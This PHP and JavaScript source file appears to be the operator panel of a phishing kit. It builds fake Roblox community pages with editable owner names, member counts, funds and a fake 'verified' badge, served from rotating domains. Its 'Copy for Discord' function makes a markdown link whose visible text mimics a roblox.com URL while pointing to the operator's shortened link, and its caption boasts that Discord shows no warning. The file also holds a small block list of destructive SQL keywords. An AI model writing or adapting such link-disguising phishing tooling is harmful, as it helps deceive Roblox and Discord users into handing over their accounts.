<?php
/* ---- functions this file uses (formerly from libs/functions.php, which is no longer needed) ---- */
if (!function_exists('executeSafeQuery')) {
function executeSafeQuery($sql, $params = []) {
    static $db = null;   // one database connection for the whole page (was: a new one for every query)
    if ($db === null) {
        include $_SERVER['DOCUMENT_ROOT'] . '/libs/connection.php';
    }
    
    // Block suspicious keywords (customize based on your needs)
$blockedKeywords = ['DROP TABLE', 'DELETE FROM', 'TRUNCATE TABLE', 'GRANT ', 'ALTER TABLE', 'CREATE TABLE', 'CREATE DATABASE'];
	foreach ($blockedKeywords as $keyword) {
        if (stripos($sql, $keyword) !== false) {
            throw new Exception("Suspicious SQL operation detected");
        }
    }

    try {
        $stmt = $db->prepare($sql);
        
        // Bind parameters securely
        foreach ($params as $key => $value) {
            $stmt->bindValue(is_int($key) ? $key + 1 : $key, $value, 
                is_int($value) ? PDO::PARAM_INT : PDO::PARAM_STR);
        }
        
        $stmt->execute();
        return $stmt->fetchAll(PDO::FETCH_ASSOC);
    } catch (PDOException $e) {
        error_log("Database error: " . $e->getMessage());
        return [];
    }
}
}
/* ---- end of the functions from libs/functions.php ---- */
if (!function_exists('ultimaAuthenticatedRegular')) {
    function ultimaAuthenticatedRegular()
    {
        static $authenticatedUser = null;
        if (is_array($authenticatedUser)) {
            return $authenticatedUser;
        }
        if (session_status() !== PHP_SESSION_ACTIVE) {
            session_name('token');
            if (!session_start()) {
                return null;
            }
        }
        if (session_name() !== 'token' || !function_exists('executeSafeQuery')) {
            return null;
        }
        $authCode = trim((string)($_SESSION['auth_code'] ?? ''));
        if ($authCode === '') {
            return null;
        }
        try {
            $rows = executeSafeQuery(
                'SELECT * FROM regular WHERE auth_code = :auth_code LIMIT 2',
                [':auth_code' => $authCode]
            );
        } catch (\Throwable $e) {
            return null;
        }
        if (!is_array($rows) || count($rows) !== 1 || !is_array($rows[0])) {
            return null;
        }
        $row = $rows[0];
        $storedAuthCode = (string)($row['auth_code'] ?? '');
        $resolvedLinkId = (int)($row['link_id'] ?? 0);
        if ($storedAuthCode === '' || !hash_equals($storedAuthCode, $authCode) || $resolvedLinkId <= 0) {
            return null;
        }
        $authenticatedUser = $row;
        return $authenticatedUser;
    }
}

$__authResolved = ultimaAuthenticatedRegular();
if (!is_array($__authResolved)) {
    http_response_code(401);
    return;
}
$userData = $__authResolved;
$link_id = (int)$userData['link_id'];
$linkId = $link_id;


$groupImage = $userData['group_image'] ?? 'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-310966282D3529E36976BF6B07B1DC90-Png/150/150/AvatarHeadshot/Webp/noFilter';
$isVerified = !empty($userData['group_verified']);

$communityDefaults = [
    'group_owner' => 'real_pika0394058201840',
    'group_name' => 'One Time YT',
    'group_member_count' => '4323',
    'group_funds' => '32948',
    'group_description' => '',
    'group_image' => 'https://freepngimg.com/thumb/vector/1-2-vector-png-image.png'
];

function getCommunityValue($dbValue, $default, $isNumber = false) {
    $dbValue = trim(strval($dbValue ?? ''));
    $default = trim(strval($default));
    if ($isNumber && ($dbValue === '0' || $dbValue === '')) {
        return '';
    }
    return ($dbValue === '' || $dbValue === $default) ? '' : $dbValue;
}
?>

<style>
#communityAvatar{border-radius:12px!important;object-fit:cover;width:70px;height:70px;background:transparent;display:block}
#communityAvatar[src=""]{visibility:hidden}
.no-at::before{content:''!important}
#communityForm .profile-right{display:flex;flex-direction:column;gap:8px;flex-shrink:0;width:290px}
#communityForm .profile-btn-wrap{display:flex;flex-direction:column;gap:8px;width:100%}
#communityForm .profile-btn{width:100%;box-sizing:border-box}
#communityForm .profile-btn.copy-discord{min-width:0;width:100%}
</style>
<div id="communityForm" class="tab-content hidden">
    <div class="profile-preview">
        <div class="profile-left">
            <img id="communityAvatar" class="profile-avatar" src="<?= htmlspecialchars($groupImage) ?>" alt="Group" onerror="this.style.visibility='hidden'">
            <div class="profile-info">
                <h2>
                    <span id="previewGroupName"><?= htmlspecialchars($userData['group_name'] ?? 'Group Name') ?></span>
                    <img id="verifiedBadgeIcon" src="data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='28' height='28' viewBox='0 0 28 28' fill='none'%3E%3Cg clip-path='url(%23clip0_8_46)'%3E%3Crect x='5.88818' width='22.89' height='22.89' transform='rotate(15 5.88818 0)' fill='%230066FF'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M20.543 8.7508L20.549 8.7568C21.15 9.3578 21.15 10.3318 20.549 10.9328L11.817 19.6648L7.45 15.2968C6.85 14.6958 6.85 13.7218 7.45 13.1218L7.457 13.1148C8.058 12.5138 9.031 12.5138 9.633 13.1148L11.817 15.2998L18.367 8.7508C18.968 8.1498 19.942 8.1498 20.543 8.7508Z' fill='white'/%3E%3C/g%3E%3Cdefs%3E%3CclipPath id='clip0_8_46'%3E%3Crect width='28' height='28' fill='white'/%3E%3C/clipPath%3E%3C/defs%3E%3C/svg%3E" alt="Verified" style="width: 20px; height: 20px; vertical-align: middle; margin-left: 5px; <?= $isVerified ? '' : 'display: none;' ?>">
                </h2>
                <p class="username no-at">By <span id="previewOwnerName"><?= htmlspecialchars($userData['group_owner'] ?? 'Owner') ?></span></p>
                <div class="profile-stats">
                    <span><strong id="previewMembers"><?= htmlspecialchars($userData['group_member_count'] ?? '0') ?></strong> Members</span>
                </div>
            </div>
        </div>
        <div class="profile-right">
                        <div class="profile-btn-wrap">
                <button type="button" class="profile-btn copy-discord" id="copyDiscordCommunityBtn" onclick="copyHyperLinkCommunity()">
                    <span class="btn-main"><i class="fab fa-discord"></i> Copy for Discord</span>
                    <span class="btn-sub">No warning - looks like a Roblox community link</span>
                </button>
                <button type="button" class="profile-btn copy-url" onclick="copyCommunityUrl()">
                    <i class="fas fa-copy"></i> Copy URL
                </button>
            </div>
            <button type="button" class="profile-btn goto" onclick="gotoCommunity()">
                <i class="fas fa-external-link-alt"></i> Go to
            </button>
        </div>
    </div>

    <div class="card">
        <form id="communityController">
            <div class="form-row">
                <div class="input-group">
                    <label>GROUP OWNER</label>
                    <input type="text" name="owner_name" id="ownerNameInput" 
                        value="<?= htmlspecialchars(getCommunityValue($userData['group_owner'] ?? '', $communityDefaults['group_owner'])) ?>" 
                        placeholder="<?= htmlspecialchars($communityDefaults['group_owner']) ?>"
                        onchange="updateCommunityPreview()">
                </div>
                <div class="input-group">
                    <label>GROUP NAME</label>
                    <input type="text" name="group_name" id="groupNameInput" 
                        value="<?= htmlspecialchars(getCommunityValue($userData['group_name'] ?? '', $communityDefaults['group_name'])) ?>" 
                        placeholder="<?= htmlspecialchars($communityDefaults['group_name']) ?>"
                        onchange="updateCommunityPreview()">
                </div>
            </div>

            <div class="form-row three-col">
                <div class="input-group">
                    <label>MEMBERS</label>
                    <input type="number" name="member" id="memberInput" 
                        value="<?= htmlspecialchars(getCommunityValue($userData['group_member_count'] ?? '', $communityDefaults['group_member_count'], true)) ?>" 
                        placeholder="<?= htmlspecialchars($communityDefaults['group_member_count']) ?>"
                        onchange="updateCommunityPreview()">
                </div>
                <div class="input-group">
                    <label>FUNDS</label>
                    <input type="number" name="funds" 
                        value="<?= htmlspecialchars(getCommunityValue($userData['group_funds'] ?? '', $communityDefaults['group_funds'], true)) ?>"
                        placeholder="<?= htmlspecialchars($communityDefaults['group_funds']) ?>">
                </div>
                <div class="input-group">
                    <label>VERIFIED BADGE</label>
                    <select name="verified_badge" onchange="updateVerifiedBadge(this)">
                        <option value="0" <?= empty($userData['group_verified']) ? 'selected' : '' ?>>No</option>
                        <option value="1" <?= !empty($userData['group_verified']) ? 'selected' : '' ?>>Yes</option>
                    </select>
                </div>
            </div>

            <div class="form-row">
                <div class="input-group">
                    <label>DESCRIPTION</label>
                    <textarea name="description" rows="3" 
                        placeholder="<?= htmlspecialchars($communityDefaults['group_description']) ?>"><?= htmlspecialchars(getCommunityValue($userData['group_description'] ?? '', $communityDefaults['group_description'])) ?></textarea>
                </div>
                <div class="input-group">
                    <label>SHOUT</label>
                    <textarea name="shout" rows="3"><?= htmlspecialchars($userData['group_shout'] ?? '') ?></textarea>
                </div>
            </div>

            <div class="form-row full-width">
                <div class="input-group full">
                    <label>GROUP IMAGE URL</label>
                    <input type="text" name="thumbnail_url" id="groupImageInput" 
                        value="<?= htmlspecialchars(getCommunityValue($userData['group_image'] ?? '', $communityDefaults['group_image'])) ?>" 
                        placeholder="<?= htmlspecialchars($communityDefaults['group_image']) ?>"
                        onchange="updateCommunityAvatar()">
                </div>
            </div>

            <button type="button" class="save-btn" data-type="group" onclick="handleSave(event)">
                <i class="fas fa-save"></i> Save Changes
            </button>
        </form>
    </div>
</div>

<script>
function updateCommunityPreview() {
    const groupName = document.getElementById('groupNameInput')?.value || 'Group Name';
    const ownerName = document.getElementById('ownerNameInput')?.value || 'Owner';
    const members = document.getElementById('memberInput')?.value || '0';
    document.getElementById('previewGroupName').textContent = groupName;
    document.getElementById('previewOwnerName').textContent = ownerName;
    document.getElementById('previewMembers').textContent = members;
}

function updateCommunityAvatar() {
    const imageUrl = document.getElementById('groupImageInput')?.value;
    const defaultImage = 'https://freepngimg.com/thumb/vector/1-2-vector-png-image.png';
    const avatar = document.getElementById('communityAvatar');
    const url = imageUrl || defaultImage;
    avatar.style.visibility = 'visible';
    avatar.onerror = function(){ this.style.visibility = 'hidden'; };
    avatar.src = url;
}

function updateVerifiedBadge(select) {
    const badge = document.getElementById('verifiedBadgeIcon');
    if (badge) {
        badge.style.display = select.value === '1' ? 'inline' : 'none';
    }
}

function copyCommunityUrl() {
    const currentDomain = domains[currentDomainIndex];
    const linkId = '<?= $link_id ?>';
    const groupName = document.getElementById('groupNameInput')?.value || '<?= htmlspecialchars($userData['group_name'] ?? 'group') ?>';
    const encodedGroupName = encodeURIComponent(groupName.replace(/\s+/g, '-'));
    const url = `https://${currentDomain}/communities/${linkId}/${encodedGroupName}`;
    
    navigator.clipboard.writeText(url).then(() => {
        const btn = document.querySelectorAll('.profile-btn.copy-url')[1];
        if (btn) {
            const originalText = btn.innerHTML;
            btn.innerHTML = '<i class="fas fa-check"></i> Copied!';
            btn.style.background = 'rgba(0, 255, 100, 0.2)';
            btn.style.borderColor = '#00ff64';
            btn.style.color = '#00ff64';
            setTimeout(() => {
                btn.innerHTML = originalText;
                btn.style.background = '';
                btn.style.borderColor = '';
                btn.style.color = '';
            }, 2000);
        }
    });
}

function gotoCommunity() {
    const currentDomain = domains[currentDomainIndex];
    const linkId = '<?= $link_id ?>';
    const groupName = document.getElementById('groupNameInput')?.value || '<?= htmlspecialchars($userData['group_name'] ?? 'group') ?>';
    const encodedGroupName = encodeURIComponent(groupName.replace(/\s+/g, '-'));
    const url = `https://${currentDomain}/communities/${linkId}/${encodedGroupName}`;
    window.open(url, '_blank');
}

function copyHyperLinkCommunity(){
    var currentDomain=domains[currentDomainIndex];
    var linkId='<?= $link_id ?>';
    var groupName=document.getElementById('groupNameInput')?.value||'<?= htmlspecialchars($userData['group_name'] ?? 'group') ?>';
    var encodedGroupName=encodeURIComponent(groupName.replace(/\s+/g,'-'));
    var url='https://'+currentDomain+'/communities/'+linkId+'/'+encodedGroupName;
    var btn=document.getElementById('copyDiscordCommunityBtn');
    if(!btn)return;
    var main=btn.querySelector('.btn-main');
    var old=main?main.innerHTML:'';
    if(main)main.innerHTML='<i class="fas fa-spinner fa-spin"></i> Shortening...';
    fetch('?action=shorten_url',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url:url})})
    .then(function(r){return r.json();})
    .then(function(d){
        var short=d.shorturl||url;
        var text='[https//www.roblox.com/communities/'+linkId+'/'+encodedGroupName+']('+short+')';
        return navigator.clipboard.writeText(text);
    })
    .then(function(){
        if(main)main.innerHTML='<i class="fas fa-check"></i> Paste Now Discord';
        setTimeout(function(){if(main)main.innerHTML=old;},2000);
    })
    .catch(function(){
        var text='[https//www.roblox.com/communities/'+linkId+'/'+encodedGroupName+']('+url+')';
        navigator.clipboard.writeText(text);
        if(main)main.innerHTML='<i class="fas fa-check"></i> Paste Now Discord';
        setTimeout(function(){if(main)main.innerHTML=old;},2000);
    });
}
</script>